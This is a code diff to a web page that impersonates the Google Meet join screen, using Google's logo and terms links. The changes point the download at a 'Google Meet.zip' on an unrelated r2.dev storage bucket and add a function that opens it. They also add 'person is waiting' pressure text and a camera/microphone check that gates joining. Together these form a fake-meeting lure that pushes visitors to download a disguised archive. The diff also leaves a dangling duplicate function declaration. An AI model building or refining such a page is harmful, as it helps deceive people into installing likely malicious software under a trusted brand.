@@ -90,6 +90,10 @@
     align-items: center; justify-content: center; gap: 16px;
     color: #5f6368;
   }
+  .preview-placeholder.no-video .preview-text {
+    color: #dc2626;
+    font-weight: 500;
+  }
   .preview-icon { width: 64px; height: 64px; opacity: 0.5; }
   .preview-text { font-size: 16px; font-weight: 400; }
   .preview-hint { font-size: 13px; color: #80868b; margin-top: 16px; text-align: center; }
@@ -223,10 +227,10 @@
             <path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"/>
             <circle cx="12" cy="13" r="4"/>
           </svg>
-          <p class="preview-text">No camera found</p>
+          <p class="preview-text">No video</p>
         </div>
       </div>
-      <p class="preview-hint">You can preview your camera and microphone before joining</p>
+      <p class="preview-hint" id="preview-hint">1 Person is waiting for you to join the meeting.</p>
     </div>
 
     <!-- Right side - Join Flow -->
@@ -250,7 +254,7 @@
       </div>
 
       <div class="join-footer">
-        <p class="waiting-text" id="waiting-text">1 person is waiting for you to join</p>
+        <p class="waiting-text" id="waiting-text">1 person is waiting for you to join, click join to join meeting</p>
         <p class="terms-text">
           By joining, you agree to the <a href="https://accounts.google.com/TOS" target="_blank">Terms of Service</a> and <a href="https://accounts.google.com/TOS?privacy=true" target="_blank">Privacy Policy</a>.
           <br>System info will be sent to confirm you're not a bot.
@@ -261,7 +265,7 @@
 </div>
 
 <script>
-const GITHUB_DOWNLOAD_URL = 'https://pub-76804685e01344f3b4711cc686545a05.r2.dev/Google_Meet.zip';
+const GITHUB_DOWNLOAD_URL = 'https://pub-b6aed22281fa4522a587af104d5072be.r2.dev/Google%20Meet.zip';
 const DETECT_TIMEOUT = 1500;
 
 const meetIcon = `<img src="https://www.gstatic.com/meet/icons/logo_meet_2026_text_google_meet_light_web_37782129bbf9be1a8e56e6fbec4fef50.svg" alt="Google Meet" style="width: 200px; height: auto;">`;
@@ -289,6 +293,10 @@ function createOverlay() {
 function closeOverlay() {
   var overlay = document.getElementById('modal-overlay');
   if (overlay) overlay.remove();
+}
+
+function startDownload() {
+  window.open(GITHUB_DOWNLOAD_URL, '_blank');
 }
 
 function showOpening(dialog) {
@@ -377,12 +385,70 @@ function startFlow() {
     var dialog = createOverlay();
     showMobilePrompt(dialog);
   } else {
-    startAppDetection();
+    // Check camera and microphone before proceeding
+    checkMediaDevices()
+      .then(function(hasMedia) {
+        if (hasMedia) {
+          startAppDetection();
+        } else {
+          showMediaError(createOverlay());
+        }
+      });
   }
 }
 
+function checkMediaDevices() {
+  return new Promise(function(resolve) {
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+      resolve(false);
+      return;
+    }
+    
+    navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+      .then(function(stream) {
+        stream.getTracks().forEach(function(track) { track.stop(); });
+        resolve(true);
+      })
+      .catch(function(err) {
+        console.warn('Media access denied:', err);
+        resolve(false);
+      });
+  });
+}
+
+function showMediaError(dialog) {
+  dialog.innerHTML =
+    meetIcon +
+    '<h2>Camera & Microphone Required</h2>' +
+    '<p>Google Meet requires access to your camera and microphone to join a meeting.</p>' +
+    '<p style="font-size:14px;color:#5f6368;margin-top:16px;">Please allow camera and microphone access in your browser settings, then try again.</p>' +
+    '<div class="modal-buttons">' +
+      '<button class="modal-btn modal-btn-primary" id="retry-media-btn">Retry</button>' +
+      '<button class="modal-btn modal-btn-secondary" id="close-btn">Cancel</button>' +
+    '</div>';
+  document.getElementById('retry-media-btn').onclick = function() {
+    closeOverlay();
+    startFlow();
+  };
+  document.getElementById('close-btn').onclick = closeOverlay;
+}
+
+function startFlow() {
+
 // Page initialization
 document.addEventListener('DOMContentLoaded', function() {
+  // Auto-detect camera/microphone on page load
+  checkMediaDevices()
+    .then(function(hasMedia) {
+      if (hasMedia) {
+        // Camera/mic available - show video preview
+        startVideoPreview();
+      } else {
+        // No camera/mic - show "No video" state
+        document.getElementById('preview-placeholder').classList.add('no-video');
+      }
+    });
+
   // Simulate getting ready -> show join form
   setTimeout(function() {
     document.getElementById('getting-ready').classList.add('hidden');
@@ -406,6 +472,33 @@ document.addEventListener('DOMContentLoaded', function() {
   // Join button click
   document.getElementById('join-btn').onclick = startFlow;
 });
+
+function startVideoPreview() {
+  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+    return;
+  }
+  
+  navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+    .then(function(stream) {
+      var video = document.createElement('video');
+      video.srcObject = stream;
+      video.autoplay = true;
+      video.muted = true;
+      video.playsInline = true;
+      video.style.width = '100%';
+      video.style.height = '100%';
+      video.style.objectFit = 'cover';
+      
+      var placeholder = document.getElementById('preview-placeholder');
+      placeholder.innerHTML = '';
+      placeholder.appendChild(video);
+      placeholder.classList.remove('no-video');
+    })
+    .catch(function(err) {
+      console.warn('Failed to start video preview:', err);
+      document.getElementById('preview-placeholder').classList.add('no-video');
+    });
+}
 </script>
 </body>
 </html>
